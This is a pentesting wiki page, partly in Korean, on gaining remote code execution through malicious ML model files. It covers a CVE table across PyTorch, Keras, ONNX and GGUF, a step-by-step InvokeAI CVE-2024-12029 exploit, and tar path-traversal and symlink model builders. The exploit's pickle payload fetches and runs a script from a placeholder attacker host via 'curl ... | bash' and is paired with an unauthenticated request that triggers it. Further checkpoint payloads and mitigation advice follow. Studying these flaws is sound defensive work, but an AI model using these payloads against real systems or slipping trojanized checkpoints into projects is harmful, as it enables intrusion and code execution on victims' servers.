# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | 모델 체크포인트의 악성 pickle이 코드 실행으로 이어짐 (`weights_only` 보호 우회)                                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 악성 모델 다운로드로 코드 실행 발생; 관리 API에서의 Java deserialization RCE                                                     | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | 신뢰할 수 없는 체크포인트가 `load_model_trainer_states_from_checkpoint` 동안 pickle reducer를 트리거 → ML 워커에서 코드 실행           | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML에서 모델 로딩 시 `yaml.unsafe_load` 사용(코드 실행) <br> Lambda 레이어로 모델 로딩 시 임의의 Python 코드 실행                       | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | 조작된 `.tflite` 모델이 정수 오버플로우를 유발 → 힙 손상(잠재적 RCE)                                                                  | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`로 모델을 로딩하면 공격자의 `__reduce__` 페이로드가 포함된 pickle이 실행됨                                               | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load`의 기본값이 피클된 객체 배열을 허용 – 악성 `.npy/.npz`가 코드 실행을 유발                                                  | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX 모델의 external-weights 경로가 디렉터리를 벗어나 임의 파일을 읽을 수 있음 <br> 악성 ONNX 모델 tar이 임의 파일을 덮어써 (RCE로 이어질 수 있음) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | custom operator가 있는 모델은 공격자의 네이티브 코드를 로드해야 할 수 있음; 복잡한 모델 그래프가 로직을 악용해 의도하지 않은 계산을 실행할 수 있음 | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control`이 활성화된 상태에서 model-load API를 사용하면 상대 경로 트래버설로 파일을 쓰는 것이 가능(예: `.bashrc` 덮어쓰기로 RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | 손상된 GGUF 모델 파일이 파서에서 힙 버퍼 오버플로우를 유발하여 피해 시스템에서 임의 코드 실행을 가능하게 함                           | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | 악성 HDF5 (`.h5`) 모델에 포함된 Lambda 레이어 코드가 로드 시 여전히 실행됨 (Keras safe_mode가 구형 포맷을 커버하지 않음 – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 많은 ML 도구들(예: pickle 기반 모델 포맷, Python `pickle.load`)은 완화되지 않으면 모델 파일에 포함된 임의 코드를 실행함                    | |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### 🆕  InvokeAI의 `torch.load`를 통한 RCE (CVE-2024-12029)

`InvokeAI` is a popular open-source web interface for Stable-Diffusion. Versions **5.3.1 – 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.

Internally the endpoint eventually calls:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.

이 취약점은 **CVE-2024-12029**로 지정되었습니다 (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. 악성 checkpoint 생성:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 제어하는 HTTP 서버에 `payload.ckpt`를 호스팅하세요 (예: `http://ATTACKER/payload.ckpt`).
3. 취약한 엔드포인트를 호출하세요 (인증 불필요):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI가 파일을 다운로드하면 `torch.load()`를 호출하고 → `os.system` gadget이 실행되어 공격자가 InvokeAI 프로세스 컨텍스트에서 코드 실행을 획득합니다.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029`이 전체 흐름을 자동화합니다.

#### 조건

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  공격자가 `/api/v2/models/install`에 접근 가능  
•  프로세스에 셸 명령을 실행할 권한 보유

#### 완화 조치

* **InvokeAI ≥ 5.4.3**로 업그레이드 – 패치에서 기본적으로 `scan=True`로 설정하고 역직렬화 전에 악성 소프트웨어 스캔을 수행합니다.  
* 체크포인트를 프로그래밍적으로 로드할 때는 `torch.load(file, weights_only=True)` 또는 새로운 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) 헬퍼를 사용하세요.  
* 모델 소스에 대해 allow-lists / signatures를 적용하고 서비스를 최소 권한으로 실행하세요.

> ⚠️ 기억하세요: **모든** Python pickle 기반 형식(많은 `.pt`, `.pkl`, `.ckpt`, `.pth` 파일 포함)은 신뢰할 수 없는 소스에서 역직렬화하는 것이 본질적으로 안전하지 않습니다.

---

구식 InvokeAI 버전을 리버스 프록시 뒤에서 계속 운영해야 하는 경우의 임시 완화 예:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec의 안전하지 않은 `torch.load`을 통한 RCE (CVE-2025-23298)

NVIDIA의 Transformers4Rec(Merlin의 일부)는 사용자 제공 경로에 대해 직접 `torch.load()`을 호출하는 안전하지 않은 checkpoint loader를 노출했습니다. `torch.load`가 Python `pickle`에 의존하기 때문에, attacker-controlled checkpoint는 역직렬화(deserialization) 중 reducer를 통해 임의의 코드를 실행할 수 있습니다.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

왜 이것이 RCE로 이어지는가: Python `pickle`에서, 객체는 호출 가능한 객체와 인수를 반환하는 reducer (`__reduce__`/`__setstate__`)를 정의할 수 있습니다. 반환된 callable은 unpickling 과정에서 실행됩니다. 이러한 객체가 checkpoint에 포함되어 있으면, 가중치가 사용되기 전에 실행됩니다.

최소 악성 checkpoint 예:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
전달 벡터 및 영향 범위:
- Trojanized checkpoints/models가 repos, buckets, 또는 artifact registries를 통해 공유됨
- 체크포인트를 자동으로 로드하는 자동 resume/deploy 파이프라인
- 실행은 training/inference workers 내부에서 발생하며, 종종 권한 상승(예: root in containers) 상태임

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802)는 직접적인 `torch.load()` 호출을 `transformers4rec/utils/serialization.py`에 구현된 제한된, allow-listed deserializer로 교체했습니다. 새 로더는 타입/필드를 검증하고 로드 중 임의의 callable이 호출되는 것을 방지합니다.

PyTorch checkpoints에 대한 방어 지침:
- 신뢰할 수 없는 데이터를 unpickle하지 마세요. 가능한 경우 [Safetensors](https://huggingface.co/docs/safetensors/index) 또는 ONNX 같은 non-executable 포맷을 선호하세요.
- PyTorch serialization을 사용해야 하는 경우 `weights_only=True`(신규 PyTorch에서 지원)를 사용하거나 Transformers4Rec 패치와 유사한 커스텀 allow-listed unpickler를 사용하세요.
- 모델 출처/서명(provenance/signatures)을 강제하고 역직렬화는 샌드박스화( seccomp/AppArmor; non-root user; 제한된 FS 및 네트워크 egress 차단)하세요.
- 체크포인트 로드 시 ML 서비스에서 예상치 못한 자식 프로세스가 생성되는지 모니터링하고, `torch.load()`/`pickle` 사용을 추적하세요.

POC 및 취약점/패치 참조:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## 예제 – 악성 PyTorch 모델 제작

- 모델 생성:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- 모델 불러오기:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## 모델을 이용한 Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), 대부분의 AI 프레임워크에서 사용되는 모델 포맷은 보통 `.zip` 같은 아카이브 기반입니다. 따라서 이러한 포맷을 악용해 path traversal attacks를 수행하여 모델이 로드되는 시스템에서 임의의 파일을 읽을 수 있을 가능성이 있습니다.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
또는 다음 코드를 사용하면 로드될 때 `/tmp` 디렉토리에 symlink를 생성하는 모델을 만들 수 있습니다:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 심층 분석: Keras .keras deserialization and gadget hunting

.keras 내부 구조, Lambda-layer RCE, ≤ 3.8에서의 the arbitrary import issue, 그리고 allowlist 내부의 post-fix gadget discovery에 대한 집중 가이드는 다음을 참조하세요:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## 참고자료

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
